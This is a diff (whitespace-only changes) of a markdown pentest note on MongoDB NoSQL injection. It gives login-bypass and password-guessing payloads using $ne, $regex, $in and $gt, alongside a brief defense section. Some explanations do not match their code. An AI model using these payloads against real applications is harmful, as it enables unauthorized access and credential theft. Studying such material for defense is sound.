@@ -31,6 +31,8 @@ NoSQL databases are becoming more popular due to their scalability and flexibili
 
 NoSQL databases are becoming more popular due to their scalability and flexibility. However, they are also vulnerable to injection attacks, just like traditional SQL databases. NoSQL injection attacks can be used to extract sensitive information from the database. In this procedure, we will use a MongoDB query to extract user data, including usernames and passwords. This attack can be used to gain access to sensitive information and escalate privileges.
 
+ 
+
 ## Requirements
 
 1. Access to a MongoDB database
@@ -38,6 +40,8 @@ NoSQL databases are becoming more popular due to their scalability and flexibili
 1. Knowledge of the database schema
 
 1. MongoDB client or tool
+
+ 
 
 ## Defense
 
@@ -47,19 +51,29 @@ NoSQL databases are becoming more popular due to their scalability and flexibili
 
 1. Regularly monitor and log database activity to detect and respond to potential attacks
 
+ 
+
 ## Objectives
 
 1. Extract usernames and passwords from a MongoDB database
 
 1. Gain unauthorized access to sensitive information
 
+ 
+
 # Instructions
 
 1. To authenticate a user in MongoDB, use the following queries in the URL or JSON format:
 
+ 
+
+
+
 **Code**: [[in URL
 username[$ne]=toto&password[$regex]=m.{2}
 u]]
+
+
 
 > The above JSON object provides MongoDB queries for user authentication. The 'username' and 'password' fields are used to authenticate the user. The queries use the '$ne' operator to match all documents where the 'username' field does not equal 'toto'. The '$regex' operator is used to match all documents where the 'password' field matches a regular expression. The regular expression is defined as follows:
 
@@ -70,6 +84,8 @@ u]]
 - md.*: matches any string that starts with 'md'.
 
 These queries can be used in either URL or JSON format, depending on the requirements of the application. The JSON format uses the '$eq' operator to match the 'username' field exactly to 'admin', and the '$regex' operator to match the 'password' field to the regular expressions defined above.
+
+
 
 **Command** ([[URL Password Regex Search]]):
 
@@ -82,6 +98,10 @@ username[$ne]=toto&password[$regex]=m.*
 username[$ne]=toto&password[$regex]=md.*
 ```
 
+
+
+
+
 **Command** ([[JSON Password Regex Search]]):
 
 ```bash
@@ -90,7 +110,11 @@ username[$ne]=toto&password[$regex]=md.*
 {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
 ```
 
+
+
 2. This command is used to extract user data from a database where the username matches any of the common usernames (Admin, 4dm1n, admin, root, administrator) and the password field is non-empty.
+
+ 
 
 > The command uses the MongoDB query language to search for documents in a database. The $in operator is used to match documents where the username field matches any of the values in the provided array. The $gt operator is used to match documents where the password field is greater than an empty string. This command can be useful for identifying potential security vulnerabilities in a system where common usernames are used.
 
@@ -114,3 +138,5 @@ username[$ne]=toto&password[$regex]=md.*
 - [[Exploit]]
 - [[Extract data information]]
 - [[NoSQL Injection]]
+
+
